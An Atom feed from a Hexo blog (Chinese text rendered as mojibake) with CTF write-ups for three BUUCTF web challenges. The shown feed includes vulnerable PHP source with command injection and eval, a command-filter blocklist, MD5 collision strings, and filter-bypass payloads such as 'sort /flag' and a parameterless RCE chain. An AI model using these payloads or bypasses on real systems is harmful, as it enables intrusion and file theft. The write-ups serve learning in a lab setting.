<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>æ—åŒ—</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-07-23T02:25:20.734Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>linbei</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuctf12</title>
    <link href="http://example.com/2021/07/22/buuctf12/"/>
    <id>http://example.com/2021/07/22/buuctf12/</id>
    <published>2021-07-22T03:01:28.000Z</published>
    <updated>2021-07-23T02:25:20.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h1><p>æ‰“å¼€å®¹å™¨<img src="/2021/07/22/buuctf12/image-20210722122459310.png" alt="image-20210722122459310"></p><h4 id="ä¸€-å‰æœŸæ¢ç´¢"><a href="#ä¸€-å‰æœŸæ¢ç´¢" class="headerlink" title="ä¸€.å‰æœŸæ¢ç´¢"></a>ä¸€.å‰æœŸæ¢ç´¢</h4><p>æ³¨æ„åˆ°ä¸€ä¸²åƒbase64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå¯¹å…¶è§£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64è§£ç ï¼šMzUzNTM1MmU3MDZlNjc=</span><br><span class="line">base64è§£ç ï¼š<span class="number">3535352e706</span>e67</span><br><span class="line">hexè§£ç ï¼š<span class="number">555.</span>png</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´å®ƒå¯¹555.pngå…ˆåè¿›è¡Œäº†ä¸€æ¬¡hexç¼–ç å’Œä¸¤æ¬¡base64ç¼–ç ï¼Œä½†æ˜¯æˆ‘ä»¬å¥½åƒçš„è§£ç å¾—åˆ°äº†å›¾ç‰‡åä¹Ÿä¸èƒ½åšä»€ä¹ˆï¼Œå†çœ‹çœ‹æºç ï¼š</p><p><img src="/2021/07/22/buuctf12/image-20210722123309733.png" alt="image-20210722123309733"></p><p>å¾ˆé•¿ä¸€ä¸²base64ç¼–ç ä¸²ï¼Œå¯¹å…¶è§£ç <img src="/2021/07/22/buuctf12/image-20210722123439519.png" alt="image-20210722123439519"></p><p>æ„Ÿè§‰åº”è¯¥å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„555.pngè¿™ä¸ªå›¾ç‰‡çš„å†…å®¹ï¼Œå°è¯•å¯¹index.phpè¿›è¡Œä¸€æ¬¡hexç¼–ç å’Œä¸¤æ¬¡base64ç¼–ç ï¼š<code>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</code>ï¼Œç„¶åä¼ å‚ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è¿”å›index.phpæ–‡ä»¶çš„å†…å®¹ã€‚</p><p><img src="/2021/07/22/buuctf12/image-20210722123811966.png" alt="image-20210722123811966"></p><p>å¯¹å›æ˜¾çš„å­—ç¬¦ä¸²base64è§£ç ï¼Œå¾—ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="äºŒ-ä»£ç å®¡è®¡"><a href="#äºŒ-ä»£ç å®¡è®¡" class="headerlink" title="äºŒ.ä»£ç å®¡è®¡"></a>äºŒ.ä»£ç å®¡è®¡</h4><p>é¦–å…ˆæˆ‘ä»¬çœ‹åˆ°ä»–å¯¹æˆ‘ä»¬ä¸Šä¼ çš„å‚æ•°imgè¿›è¡Œè§£ç ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™$fileï¼Œç„¶åç”¨file_get_contents()å‡½æ•°å»åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ä¼šæƒ³ï¼Œèƒ½ä¸èƒ½æŠŠflag.phpæŒ‰ç…§ä»–çš„è¦æ±‚ç¼–ç åï¼Œé€šè¿‡msgä¸Šä¼ å‘¢ï¼Ÿå¾ˆæ˜æ˜¾æˆ‘ä»¬æ— æ³•é€šè¿‡è¿™æ ·åšæ¥å¾—åˆ°flagï¼Œå› ä¸ºä»–å¯¹$fileçš„å€¼è¿›è¡Œäº†ä¸¤ä¸ªæ­£åˆ™åŒ¹é…ï¼Œåšäº†ä¸¥æ ¼è¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬è¿™è¾¹æ˜¯æ²¡åŠæ³•ç»•è¿‡ã€‚æˆ‘ä»¬æ¥ç€å¾€ä¸‹å®¡è®¡ï¼Œå¯ä»¥çœ‹åˆ°ä»–å¯¹$cmdä¹Ÿåšäº†å¾ˆå¤šè¿‡æ»¤ã€‚ç„¶åè¿™è¾¹è¦æˆ‘ä»¬POSTä¸¤ä¸ªå‚æ•°ï¼Œå½“æ»¡è¶³ifè¯­å¥å‚æ•°açš„å€¼ç­‰å‚æ•°bçš„å€¼ï¼Œä¸”md5()ç¼–ç åå‚æ•°aã€bçš„å€¼ä¸åŒæ—¶ï¼Œä¼šå°†æˆ‘ä»¬ä¼ å‚çš„cmdçš„å€¼å½“ä½œä»£ç æ‰§è¡Œå®Œè¾“å‡ºã€‚</p><h4 id="ä¸‰-æ€è·¯æ„å»º"><a href="#ä¸‰-æ€è·¯æ„å»º" class="headerlink" title="ä¸‰.æ€è·¯æ„å»º"></a>ä¸‰.æ€è·¯æ„å»º</h4><p>å› æ­¤æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯å…ˆæ„é€ æ»¡è¶³ifè¯­å¥çš„ä¸¤ä¸ªå‚æ•°ï¼Œç„¶åé€šè¿‡å‘½ä»¤æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆæ»¡è¶³ifè¯­å¥å‘¢ï¼Ÿä¸€å¼€å§‹æˆ‘æƒ³çš„æ˜¯ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯è¿™é‡Œå‰åŠæ®µåˆ¤æ–­è¯­å¥ç”¨stringå¼ºè¡Œè½¬å‹äº†<img src="/2021/07/22/buuctf12/image-20210723090044290.png"></p><p>ä¹Ÿå°±æ˜¯è¯´ç”¨æ•°ç»„æ— æ³•ç»•è¿‡ifè¯­å¥å‰åŠéƒ¨åˆ†çš„åˆ¤æ–­ï¼Œå› æ­¤æˆ‘ä»¬è¦åˆ©ç”¨MD5ç¢°æ’ï¼Œæ„é€ ä¸¤ä¸ªä¸åŒï¼Œä½†MD5ç¼–ç ç›¸åŒçš„å­—ç¬¦ä¸²</p><p><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</code></p><p><code>b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></p><p>ç„¶åæˆ‘ä»¬è¦æ€ä¹ˆè·å–flagå‘¢ï¼Ÿ</p><p>æ³•ä¸€ï¼šåœ¨linuxç³»ç»Ÿä¸­ï¼Œ<code>ca\t</code>ã€<code>c\at</code>éƒ½ä¼šè¢«è§£æä¸ºcatï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>ca\t flag</code>æ¥è·å–flagï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªç–‘æƒ‘ï¼Œæ­£åˆ™åŒ¹é…ä¸æ˜¯æœ‰<code>\\\\</code>ã€<code>\\</code>ã€<code>\t</code>ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼ŒåŸå› æ˜¯<code>\a</code> <code>\t</code>ä¼šè¢«çœ‹åšæ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡åæ–œæ ï¼›è¿™é‡Œä¹‹æ‰€ä»¥æ²¡æœ‰æ­£åˆ™åŒ¹é…<code>\t</code>æ˜¯å› ä¸ºæ­£åˆ™åŒ¹é…ä¸­çš„æ˜¯åŒ¹é…ä¸€ä¸ªæ°´å¹³åˆ¶è¡¨ç¬¦ï¼ˆ<code>\t</code>ï¼‰ï¼Œè‹¥è¦æƒ³æ‹¦æˆªå­—ç¬¦ä¸²<code>\t</code> å°±è¦æ·»åŠ <code>\\t</code>æ­£åˆ™åŒ¹é…ã€‚<img src="/2021/07/22/buuctf12/image-20210723102035547.png" alt="image-20210723102035547"></p><p>æ³•äºŒï¼šlinuxç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªå‘½ä»¤<code>sort</code>ï¼šå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åä¾æ¬¡æŒ‰ASCIIç è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†å®ƒä»¬æŒ‰å‡åºè¾“å‡ºï¼ˆå°±æ˜¯æŒ‰è¡Œæ’åºï¼‰ã€‚</p><p><img src="/2021/07/22/buuctf12/image-20210723102208373.png" alt="image-20210723102208373"></p><p>payloadï¼š<code>sort /flag</code></p><p><img src="/2021/07/22/buuctf12/image-20210723102317354.png" alt="image-20210723102317354"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å®‰æ´µæ¯-2019-easy-web&quot;&gt;&lt;a href=&quot;#å®‰æ´µæ¯-2019-easy-web&quot; class=&quot;headerlink&quot; title=&quot;[å®‰æ´µæ¯ 2019]easy_web&quot;&gt;&lt;/a&gt;[å®‰æ´µæ¯ 2019]easy_web&lt;/h1&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨&lt;img</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf11</title>
    <link href="http://example.com/2021/07/21/buuctf11/"/>
    <id>http://example.com/2021/07/21/buuctf11/</id>
    <published>2021-07-21T00:40:37.000Z</published>
    <updated>2021-07-22T04:08:08.359Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ç™»å…¥é¡µé¢</p><p><img src="/2021/07/21/buuctf11/image-20210721091910329.png" alt="image-20210721091910329"></p><p>ç»“åˆé¢˜ç›®ï¼Œè¿™é¢˜è‚¯å®šä¸æ˜¯SQLæ³¨å…¥äº†ï¼Œç‚¹å‡»<code>help</code><img src="/2021/07/21/buuctf11/image-20210721092018824.png" alt="image-20210721092018824"></p><p>å¯ä»¥çœ‹åˆ°æœ‰æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯æ²¡æœ‰åŒ…å«çš„æ–‡ä»¶æ²¡æœ‰èµ·ä½œç”¨ï¼Œå°è¯•å§GETè¯·æ±‚æ”¹ä¸ºPOST<img src="/2021/07/21/buuctf11/image-20210721092725070.png" alt="image-20210721092725070"></p><p>ä½†æ˜¯help.docxè¿™ä¸ªæ–‡ä»¶é‡Œæ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼Œç„¶åæˆ‘å°è¯•ç”¨php://filteræ–‡ä»¶è¯»å–æµè¯»å–index.phpã€flag.phpéƒ½æ²¡æœ‰æˆåŠŸ</p><p>ç„¶åæˆ‘å°±æœ‰ç‚¹ä¸çŸ¥æ‰€æªäº†ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹wpå­¦ä¹ äº†å…³äºjavaçš„ç›¸å…³åŸºç¡€çŸ¥è¯†</p><h4 id="ä¸€-é¢„å¤‡çŸ¥è¯†"><a href="#ä¸€-é¢„å¤‡çŸ¥è¯†" class="headerlink" title="ä¸€.é¢„å¤‡çŸ¥è¯†"></a>ä¸€.é¢„å¤‡çŸ¥è¯†</h4><p>ï¼ˆ1ï¼‰<img src="/2021/07/21/buuctf11/image-20210721093815452.png" alt="image-20210721093815452"></p><p>ï¼ˆ2ï¼‰</p><p><img src="/2021/07/21/buuctf11/image-20210721100648964.png" alt="image-20210721100648964"></p><p>ï¼ˆ3ï¼‰ç”±äºå®¢æˆ·ç«¯æ˜¯é€šè¿‡URLåœ°å€è®¿é—®WebæœåŠ¡å™¨ä¸­çš„èµ„æºï¼Œæ‰€ä»¥Servletç¨‹åºè‹¥æƒ³è¢«å¤–ç•Œè®¿é—®ï¼Œå¿…é¡»æŠŠServletç¨‹åºæ˜ å°„åˆ°ä¸€ä¸ªURLåœ°å€ä¸Šï¼Œè¿™ä¸ªå·¥ä½œåœ¨web.xmlæ–‡ä»¶ä¸­ä½¿ç”¨<code>&lt;servlet&gt;</code>å…ƒç´ å’Œ<code>&lt;servlet-mapping&gt;</code>å…ƒç´ å®Œæˆã€‚<code>&lt;servlet&gt;</code>å…ƒç´ ç”¨äºæ³¨å†ŒServletï¼Œå®ƒåŒ…å«æœ‰ä¸¤ä¸ªä¸»è¦çš„å­å…ƒç´ ï¼š<code>&lt;servlet-name&gt;</code>å’Œ<code>&lt;servlet-class&gt;</code>ï¼Œåˆ†åˆ«ç”¨äºè®¾ç½®Servletçš„æ³¨å†Œåç§°å’ŒServletçš„å®Œæ•´ç±»åã€‚ä¸€ä¸ª<code>&lt;servlet-mapping&gt;</code>å…ƒç´ ç”¨äºæ˜ å°„ä¸€ä¸ªå·²æ³¨å†Œçš„Servletçš„ä¸€ä¸ªå¯¹å¤–è®¿é—®è·¯å¾„ï¼Œå®ƒåŒ…å«æœ‰ä¸¤ä¸ªå­å…ƒç´ ï¼š<code>&lt;servlet-name&gt;</code>å’Œ<code>&lt;url-pattern&gt;</code>ï¼Œåˆ†åˆ«ç”¨äºæŒ‡å®šServletçš„æ³¨å†Œåç§°å’ŒServletçš„å¯¹å¤–è®¿é—®è·¯å¾„ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;ServletDemo1&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;cn.itcast.ServletDemo1&lt;&#x2F;servlet-class&gt;</span><br><span class="line">&lt;&#x2F;servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;ServletDemo1&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;&#x2F;ServletDemo1&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure><h4 id="äºŒ-å°è¯•è§£é¢˜"><a href="#äºŒ-å°è¯•è§£é¢˜" class="headerlink" title="äºŒ.å°è¯•è§£é¢˜"></a>äºŒ.å°è¯•è§£é¢˜</h4><p>å…ˆè®¿é—®WEB-INF/web.xmlï¼Œè·å–classæ–‡ä»¶è·¯å¾„</p><p><img src="/2021/07/21/buuctf11/image-20210721105256117.png"></p><p>æˆ‘ä»¬çœ‹åˆ°æœ‰æˆ‘ä»¬æƒ³è¦çš„flagæ–‡ä»¶ï¼Œæ„é€ è·¯å¾„</p><p>payload:<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p><p><img src="/2021/07/21/buuctf11/image-20210721111308014.png" alt="image-20210721111308014"></p><p>å¯ä»¥çœ‹åˆ°å›æ˜¾æœ‰ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç å¾—flagï¼š<img src="/2021/07/21/buuctf11/image-20210721111509635.png" alt="image-20210721111509635"></p><h1 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå°±ä¸€å¥è¯<img src="/2021/07/21/buuctf11/image-20210721211106234.png" alt="image-20210721211106234"></p><h4 id="ä¸€-å‰æœŸæ¢ç´¢"><a href="#ä¸€-å‰æœŸæ¢ç´¢" class="headerlink" title="ä¸€.å‰æœŸæ¢ç´¢"></a>ä¸€.å‰æœŸæ¢ç´¢</h4><p>æŸ¥çœ‹æºç ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼›æŠ“åŒ…ä¹Ÿæ²¡æœ‰çº¿ç´¢ï¼›ç”¨dirsearchè·‘buuä¼šå´©ï¼›æœ€åç”¨GitHackå‘ç°å­˜åœ¨gitæºç æ³„éœ²</p><p><img src="/2021/07/21/buuctf11/image-20210721211350046.png" alt="image-20210721211350046"></p><p>æ‰“å¼€index.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼š</p><p>1.ç¬¬ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼šä»–ç¦ç”¨äº†å‡ ç§çš„ä¼ªåè®®ï¼Œä¹Ÿå°±æ˜¯è¯´é™åˆ¶æˆ‘ä»¬ä½¿ç”¨ä¼ªåè®®å»è¯»å–åå°æ–‡ä»¶ï¼›</p><p>2.ç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…ï¼š<code>(?R)æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼</code>,è€Œ<code>(?R)?</code>å¯ä»¥å¼•ç”¨ä¹Ÿå¯ä»¥ä¸å¼•ç”¨äº†ï¼Œå¼•ç”¨ä¸€æ¬¡æ­£åˆ™åˆ™å˜æˆäº†<code>[a-z,_]+\([a-z,_]+\((?R)?\)\)</code>,å¯ä»¥è¿­ä»£ä¸‹å»ï¼Œé‚£ä¹ˆå®ƒæ‰€åŒ¹é…çš„å°±æ˜¯<code>a(b(c()));</code>ç±»ä¼¼è¿™ç§å¯ä»¥æ‹¬å·å’Œå­—ç¬¦ç»„æˆçš„ï¼Œè¿™å…¶å®æ˜¯<code>æ— å‚æ•°RCE</code>æ¯”è¾ƒå…¸å‹çš„ä¾‹å­ï¼›</p><p><img src="/2021/07/21/buuctf11/image-20210722085404591.png" alt="image-20210722085404591"></p><p>3.ç¬¬ä¸‰ä¸ªæ­£åˆ™åŒ¹é…ï¼šè¿‡æ»¤äº†<code>et|na|info|dec|bin|hex|oct|pi|log</code>è¿™å‡ ç§è¯æ ¹</p><h4 id="äºŒ-æ€è·¯æ„å»º"><a href="#äºŒ-æ€è·¯æ„å»º" class="headerlink" title="äºŒ.æ€è·¯æ„å»º"></a>äºŒ.æ€è·¯æ„å»º</h4><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æœåŠ¡å™¨ä¸­è¯¥ç›®å½•ä¸‹å­˜åœ¨å“ªäº›æ–‡ä»¶ï¼Œå¾€å¸¸æ¥è¯´ç”¨æŒ‡ä»¤<code>scandir(&#39;.&#39;)</code>å°±è¡Œï¼Œä½†æ˜¯è¿™é‡Œç”±äºç¬¬äºŒä¸ªæ­£åˆ™åŒ¹é…ä¸èƒ½ä¼ å‚ã€‚é‚£è¦æ€ä¹ˆå»è·å–è¿™ä¸ª<code>.</code>å‘¢ï¼Ÿ</p><p>è¿™é‡Œå…ˆä»‹ç»ä¸¤ä¸ªå‡½æ•°ï¼š</p><p>1.<code>localeconv()</code>å‡½æ•°ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</p><p><img src="/2021/07/21/buuctf11/image-20210722090527575.png" alt="image-20210722090527575"></p><p>2.<code>current()</code>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</p><p>çŸ¥é“äº†è¿™ä¸¤ä¸ªå‡½æ•°æˆ‘ä»¬å°±å¯ä»¥æ„é€ payloadï¼š<code>?exp=print_r(scandir(current(localeconv())))ï¼›</code></p><p><img src="/2021/07/21/buuctf11/image-20210722091025697.png"></p><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨flag.phpï¼Œé‚£æˆ‘ä»¬è¦å°è¯•å»è¯»å–å®ƒ</p><ul><li>å†ä»‹ç»å‡ ä¸ªå‡½æ•°ï¼š</li></ul><ol><li><code>array_reverse()</code> ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</li><li><code>array_flip()</code> äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</li><li><code>array_rand()</code> ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ(è¿”å›çš„æ˜¯é”®å)ï¼Œä¸æ–­åˆ·æ–°è®¿é—®å°±ä¼šä¸æ–­éšæœºè¿”å›</li><li><code>next() </code>æŠŠæŒ‡å‘å½“å‰å…ƒç´ çš„æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ çš„ä½ç½®ï¼Œå¹¶è¿”å›å½“å‰å…ƒç´ çš„å€¼ã€‚</li></ol><p>å› æ­¤æˆ‘ä»¬è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è¯»å–flag.phpæ–‡ä»¶ï¼Œç”±äº<code>get_file_contents</code>è¢«ç¦äº†ï¼ˆå«etï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>readfile</code>ã€<code>show_source</code>ã€<code>highlight_file</code>è¯»å–æ–‡ä»¶</p><p>payload1ï¼š<code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p><p><img src="/2021/07/21/buuctf11/image-20210722092408748.png" 